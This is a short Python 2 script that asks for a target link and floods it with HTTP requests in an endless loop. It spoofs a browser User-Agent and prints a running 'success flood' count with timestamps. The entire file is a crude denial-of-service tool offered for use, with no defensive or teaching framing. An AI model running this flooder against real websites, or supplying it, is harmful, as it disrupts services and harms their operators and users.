import urllib2, time
from urllib2 import URLError

agent = {'User-Agent':'Mozilla/5.0'}
inp_link = raw_input("[+] Enter Link to Flood Access: ")

def banned(inp_link):
    request = urllib2.Request(inp_link, headers=agent)
    dump = urllib2.urlopen(request)
    return dump

tmp = 0
while True:
    tmp += 1
    try:
        banned(inp_link)
        print "[+] Success flood ke: %s" % tmp, time.strftime(' --at time: %H minute: %M second: %S')

    except URLError, e:
        print "[+] Lost Connection..."
        banned(inp_link)
